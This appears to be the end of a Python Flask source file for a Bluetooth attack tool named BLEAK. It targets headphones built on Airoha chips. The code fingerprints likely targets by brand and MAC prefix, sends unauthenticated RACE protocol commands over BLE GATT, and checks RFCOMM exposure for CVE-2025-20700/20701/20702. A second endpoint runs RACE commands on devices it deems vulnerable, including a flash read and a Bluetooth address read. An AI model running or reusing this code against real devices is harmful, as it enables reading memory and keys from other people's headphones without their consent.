                                   0x00, 0x00, 0x00, 0x00,
                                   0x00, 0x01, 0x00, 0x00, 0x00])

# Brands known to use Airoha chipsets (for passive fingerprinting)
AIROHA_BRAND_HINTS = [
    "wh-", "wf-", "sony",        # Sony (Airoha AB156x common)
    "jvc",                        # JVC
    "pioneer",                    # Pioneer
    "soundcore", "anker",         # Anker/Soundcore (some models)
    "technics",                   # Panasonic Technics
    "denon",                      # Denon
    "audio-technica", "ath-",     # Audio-Technica
    "edifier",                    # Edifier
    "jbl tune", "jbl live",       # JBL (some models)
    "1more",                      # 1More
    "jabra evolve",               # Jabra
    "sennheiser momentum",        # Sennheiser
    "fiio",                       # FiiO
    "tozo",                       # TOZO
]


def _is_likely_airoha(name: str, mac: str) -> bool:
    """Passive fingerprint: is this device likely Airoha-based?"""
    nl = (name or "").lower()
    if any(h in nl for h in AIROHA_BRAND_HINTS):
        return True
    oui = mac.upper()[:8] if mac else ""
    return oui in AIROHA_OUI_PREFIXES


@app.route("/api/audio/race-check", methods=["POST"])
def audio_race_check():
    """RACE/Airoha vulnerability check — CVE-2025-20700/20701/20702.

    Passive + active detection:
      PASSIVE: Check device name/OUI for Airoha chip hints
      ACTIVE CVE-2025-20700: Connect GATT → look for RACE service UUIDs
                              → attempt unauthenticated RACE command
      ACTIVE CVE-2025-20701: Check RFCOMM SDP for RACE service (via sdptool)
      CVE-2025-20702: Both BLE + Classic RACE exposure

    Non-blocking — poll /api/audio/whisperpair-status/<job_id>.
    """
    try:
        data = request.get_json(silent=True) or {}
        mac = data.get("mac", "").strip().upper()
        name = data.get("name", "")
        if not mac:
            return jsonify({"error": "MAC required"}), 400

        job_id = "race_{}_{}".format(mac.replace(":", "_"), int(time.time()))
        if not hasattr(STATE, "_wp_jobs"):
            STATE._wp_jobs = {}
        job = {
            "job_id":    job_id,
            "mac":       mac,
            "name":      name,
            "status":    "running",
            "step":      "init",
            "steps":     [],
            "verdict":   None,
            "details":   "",
            "cves":      [],
            "race_service_found": False,
            "race_cmd_response":  None,
            "airoha_likely":      False,
            "classic_vulnerable": None,
        }
        STATE._wp_jobs[job_id] = job

        def _step(msg):
            job["steps"].append(msg)
            job["step"] = msg

        def _run():
            import asyncio, subprocess as _sp, time as _tm
            from bleak import BleakClient, BleakScanner

            # ── Phase 0: Passive fingerprint ───────────────────────────────
            _step("passive_fingerprint")
            airoha_likely = _is_likely_airoha(name, mac)
            job["airoha_likely"] = airoha_likely

            # Try to get name from discovery cache if not provided
            dev_name = name
            if not dev_name:
                for d in STATE.discovered_devices:
                    if d.get("mac", "").upper() == mac:
                        dev_name = d.get("name", "")
                        break
                airoha_likely = _is_likely_airoha(dev_name, mac)
                job["airoha_likely"] = airoha_likely
                job["name"] = dev_name

            job["details"] = "Device: {} [{}] | Airoha chip likely: {}".format(
                dev_name or "?", mac, "Sim" if airoha_likely else "Não (mas verificando)")

            # ── Phase 1: Register device in BlueZ (needed for BleakClient) ─
            _step("bluez_register")
            try:
                proc = _sp.Popen(["bluetoothctl"], stdin=_sp.PIPE,
                                 stdout=_sp.PIPE, stderr=_sp.PIPE, text=True)
                proc.stdin.write("scan on\n"); proc.stdin.flush()
                _tm.sleep(4)
                proc.stdin.write("scan off\nquit\n"); proc.stdin.flush()
                proc.communicate(timeout=5)
            except Exception:
                try: proc.kill()
                except: pass

            # ── Phase 2: BLE GATT — CVE-2025-20700 ─────────────────────────
            _step("gatt_connect")
            race_svc_found = False
            race_char = None
            race_response = None
            cves_found = []

            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            try:
                async def _gatt_check():
                    nonlocal race_svc_found, race_char, race_response

                    try:
                        async with BleakClient(mac, timeout=25) as client:
                            if not client.is_connected:
                                job["details"] += " | GATT connection refused"
                                return

                            _step("service_enum")
                            all_svcs = list(client.services)
                            svc_uuids = [s.uuid.lower() for s in all_svcs]
                            char_uuids = [c.uuid.lower()
                                          for s in all_svcs for c in s.characteristics]

                            # Check for RACE service UUIDs
                            for r_uuid in RACE_SERVICE_UUIDS:
                                if r_uuid.lower() in svc_uuids:
                                    race_svc_found = True
                                    job["details"] += " | RACE svc: " + r_uuid[:8]
                                    break

                            # Check for RACE characteristic UUIDs
                            for r_char in RACE_CHAR_UUIDS:
                                if r_char.lower() in char_uuids:
                                    race_svc_found = True
                                    # Find the writable one
                                    for svc in all_svcs:
                                        for ch in svc.characteristics:
                                            if r_char.lower() in ch.uuid.lower():
                                                props = [p.lower() for p in ch.properties]
                                                if "write" in props or "write-without-response" in props:
                                                    race_char = ch
                                                    break
                                    job["details"] += " | RACE char: " + r_char[:8]
                                    break

                            if not race_svc_found:
                                job["details"] += " | No RACE UUIDs found in GATT"
                                return

                            # ── Attempt unauthenticated RACE command ──────
                            if race_char:
                                _step("race_cmd_attempt")
                                notify_resp = []
                                def _notify(sender, data):
                                    notify_resp.append(bytes(data))

                                # Enable notifications if supported
                                try:
                                    props = [p.lower() for p in race_char.properties]
                                    if "notify" in props:
                                        await client.start_notify(race_char.uuid, _notify)
                                except Exception:
                                    pass

                                # Send GET_SDK_INFO command
                                write_ok = False
                                try:
                                    await client.write_gatt_char(
                                        race_char.uuid, RACE_CMD_GET_SDK_INFO,
                                        response=True)
                                    write_ok = True
                                except Exception as we:
                                    job["details"] += " | Write err: " + str(we)[:60]

                                if write_ok:
                                    await asyncio.sleep(2)
                                    if notify_resp:
                                        race_response = notify_resp[0].hex()
                                        job["race_cmd_response"] = race_response
                                        job["details"] += (" | RACE resp: " +
                                                           race_response[:32] + "...")

                                try:
                                    await client.stop_notify(race_char.uuid)
                                except Exception:
                                    pass

                    except Exception as e:
                        err = str(e)
                        if "not found" in err.lower():
                            job["details"] += (" | Device não encontrado no BlueZ DBus "
                                               "— tente executar Discovery primeiro")
                        else:
                            job["details"] += " | GATT err: " + err[:80]

                loop.run_until_complete(_gatt_check())
            finally:
                loop.close()

            job["race_service_found"] = race_svc_found

            # CVE-2025-20700: RACE via BLE without auth
            if race_svc_found and race_response:
                cves_found.append({
                    "cve": "CVE-2025-20700",
                    "desc": "RACE protocol exposed via BLE GATT sem autenticação",
                    "severity": "HIGH",
                    "impact": "RAM/flash dump, link-key extraction, eavesdropping, firmware downgrade",
                    "response_hex": race_response[:32],
                })
            elif race_svc_found:
                cves_found.append({
                    "cve": "CVE-2025-20702",
                    "desc": "RACE service UUID detectado via BLE GATT (protocolo exposto)",
                    "severity": "MEDIUM",
                    "impact": "Potencial acesso ao protocolo RACE — teste manual recomendado com race-toolkit",
                    "response_hex": None,
                })

            # ── Phase 3: Classic BT RFCOMM — CVE-2025-20701 ────────────────
            _step("rfcomm_check")
            classic_vuln = None
            if race_svc_found or airoha_likely:
                try:
                    # Try sdptool to enumerate RFCOMM services
                    r = _sp.run(["sdptool", "browse", "--tree", mac],
                                capture_output=True, text=True, timeout=15)
                    out = r.stdout + r.stderr
                    # Look for RACE RFCOMM service (typically channel 14/15)
                    if ("ae" in out.lower() and "rfcomm" in out.lower()):
                        classic_vuln = True
                        cves_found.append({
                            "cve": "CVE-2025-20701",
                            "desc": "RACE protocol exposto via BT Classic RFCOMM sem autenticação",
                            "severity": "HIGH",
                            "impact": "Classic BT access to RACE commands — pivoting from BLE to Classic",
                            "response_hex": None,
                        })
                        job["details"] += " | RACE RFCOMM detectado"
                    elif r.returncode == 0 and "rfcomm" in out.lower():
                        job["details"] += " | RFCOMM services: {}".format(
                            len([l for l in out.splitlines() if "rfcomm" in l.lower()]))
                    else:
                        job["details"] += " | RFCOMM scan: não conectável / não disponível"
                except FileNotFoundError:
                    job["details"] += " | sdptool não encontrado (instale bluez-tools)"
                except Exception as e:
                    job["details"] += " | RFCOMM err: " + str(e)[:60]

            job["classic_vulnerable"] = classic_vuln
            job["cves"] = cves_found

            # ── Verdict ─────────────────────────────────────────────────────
            high_cves = [c for c in cves_found if c["severity"] == "HIGH"]
            med_cves  = [c for c in cves_found if c["severity"] == "MEDIUM"]

            if high_cves:
                verdict = "VULNERABLE"
                cve_list = ", ".join(c["cve"] for c in cves_found)
                job["details"] += (
                    " | 🔴 VULNERÁVEL: {} — Chip Airoha com protocolo RACE acessível "
                    "sem autenticação. Permite dump de RAM/flash, extração de link keys, "
                    "eavesdropping e downgrade de firmware.".format(cve_list))
            elif med_cves:
                verdict = "UNCERTAIN"
                job["details"] += (
                    " | 🟡 RACE service detectado — possível {}. "
                    "Execute race-toolkit para confirmação completa: "
                    "python race_toolkit.py --transport bleak check".format(
                        med_cves[0]["cve"]))
            elif airoha_likely and not race_svc_found:
                verdict = "PATCHED"
                job["details"] += (
                    " | 🟢 Device parece usar chip Airoha mas RACE service "
                    "não detectado — provalmente patched ou versão não afetada.")
            else:
                verdict = "NOT_APPLICABLE"
                job["details"] += (
                    " | ⚪ Nenhum indicador Airoha/RACE detectado. "
                    "Device provavelmente não usa chip Airoha.")

            job.update({"verdict": verdict, "status": "done"})

        t = threading.Thread(target=_run, daemon=True)
        t.start()

        return jsonify({"job_id": job_id, "status": "running", "mac": mac,
                        "message": "RACE check started. Poll /api/audio/whisperpair-status/" + job_id})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/audio/race-cmd", methods=["POST"])
def audio_race_cmd():
    """Execute a specific RACE command on a confirmed vulnerable device.

    Commands: sdkinfo, buildversion, bdaddr, flash_header
    Non-blocking — poll /api/audio/whisperpair-status/<job_id>.
    """
    try:
        data = request.get_json(silent=True) or {}
        mac  = data.get("mac", "").strip().upper()
        cmd  = data.get("cmd", "sdkinfo")
        if not mac:
            return jsonify({"error": "MAC required"}), 400

        cmd_map = {
            "sdkinfo":      RACE_CMD_GET_SDK_INFO,
            "buildversion": RACE_CMD_GET_BUILD_VER,
            "bdaddr":       RACE_CMD_GET_BDADDR,
            "flash_header": RACE_CMD_FLASH_READ,
        }
        payload = cmd_map.get(cmd, RACE_CMD_GET_SDK_INFO)

        job_id = "racecmd_{}_{}".format(mac.replace(":", "_"), int(time.time()))
        if not hasattr(STATE, "_wp_jobs"):
            STATE._wp_jobs = {}
        job = {"job_id": job_id, "mac": mac, "cmd": cmd,
               "status": "running", "step": "connect",
               "steps": [], "verdict": None, "details": "",
               "response_hex": None, "response_ascii": None}
        STATE._wp_jobs[job_id] = job

        def _step(m): job["steps"].append(m); job["step"] = m

        def _run():
            import asyncio, time as _tm
            from bleak import BleakClient

            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            try:
                async def _exec():
                    _step("gatt_connect")
                    try:
                        async with BleakClient(mac, timeout=20) as client:
                            if not client.is_connected:
                                job.update({"verdict": "ERROR",
                                            "details": "Não conectou",
                                            "status": "done"})
                                return
                            _step("find_race_char")
                            race_char = None
                            for svc in client.services:
                                for ch in svc.characteristics:
                                    if any(r in ch.uuid.lower()
                                           for r in ["ae05", "ae06", "ae07",
                                                     "ae03", "ae04"]):
                                        props = [p.lower() for p in ch.properties]
                                        if "write" in props or "write-without-response" in props:
                                            race_char = ch
                                            break
                                if race_char:
                                    break

                            if not race_char:
                                job.update({"verdict": "ERROR",
                                            "details": "RACE char não encontrada — device pode não ser Airoha",
                                            "status": "done"})
                                return

                            _step("send_race_cmd")
                            resp = []
                            def _n(s, d): resp.append(bytes(d))
                            try:
                                if "notify" in [p.lower() for p in race_char.properties]:
                                    await client.start_notify(race_char.uuid, _n)
                            except Exception: pass

                            await client.write_gatt_char(
                                race_char.uuid, payload, response=True)
                            await asyncio.sleep(2)

                            try: await client.stop_notify(race_char.uuid)
                            except Exception: pass

                            if resp:
                                hex_r = resp[0].hex()
                                ascii_r = "".join(
                                    chr(b) if 32 <= b < 127 else "." for b in resp[0])
                                job.update({
                                    "verdict": "SUCCESS",
                                    "response_hex": hex_r,
                                    "response_ascii": ascii_r,
                                    "details": "Cmd {} OK — {} bytes".format(
                                        cmd, len(resp[0])),
                                    "status": "done"
                                })
                            else:
                                job.update({"verdict": "NO_RESPONSE",
                                            "details": "Cmd enviado mas sem resposta",
                                            "status": "done"})
                    except Exception as e:
                        job.update({"verdict": "ERROR",
                                    "details": str(e)[:120],
                                    "status": "done"})

                loop.run_until_complete(_exec())
            finally:
                loop.close()

        t = threading.Thread(target=_run, daemon=True)
        t.start()
        return jsonify({"job_id": job_id, "status": "running", "mac": mac, "cmd": cmd,
                        "message": "RACE cmd started. Poll /api/audio/whisperpair-status/" + job_id})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


if __name__ == "__main__":
    # Print registered audio routes for debugging
    import sys, os
    os.environ.setdefault("PYTHONIOENCODING", "utf-8")
    C = "\033[0;36m"; B = "\033[1;34m"; Y = "\033[1;33m"; G = "\033[0;32m"; R = "\033[0m"
    banner = f"""
{C} ██████╗ ██╗     ███████╗ █████╗ ██╗  ██╗{R}
{C} ██╔══██╗██║     ██╔════╝██╔══██╗██║ ██╔╝{R}
{C} ██████╔╝██║     █████╗  ███████║█████╔╝ {R}
{C} ██╔══██╗██║     ██╔══╝  ██╔══██║██╔═██╗ {R}
{C} ██████╔╝███████╗███████╗██║  ██║██║  ██╗{R}
{C} ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝{R}
{B} Bluetooth Link Exploitation & Attack Knowledgebase{R}
"""
    sys.stdout.buffer.write(banner.encode("utf-8"))
    sys.stdout.buffer.flush()
    routes = [r.rule for r in app.url_map.iter_rules() if 'audio' in r.rule or 'bluehood' in r.rule]
    print(f" {Y}⚡ BLEAK {APP_VERSION}{R}  —  {len(routes)} audio/bluehood routes loaded")
    print("")
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="0.0.0.0")
    parser.add_argument("--port", type=int, default=8080)
    args = parser.parse_args()
    detect_esp32()
    # Setup required directories with correct ownership
    import pwd as _spwd2
    _real_user2 = os.environ.get("SUDO_USER") or os.environ.get("USER") or "kali"
    for _d in ["reports", "captures"]:
        os.makedirs(_d, exist_ok=True)
        try:
            _ui = _spwd2.getpwnam(_real_user2)
            os.chown(_d, _ui.pw_uid, _ui.pw_gid)
            os.chmod(_d, 0o775)
        except Exception:
            pass

    logger.info("BLEAK %s on %s:%d | ESP32: %s | HCI: %s (%s)",
                APP_VERSION, args.host, args.port, ESP32_AVAILABLE, _refresh_hci(), detect_hci0())
    app.run(host=args.host, port=args.port, debug=False)
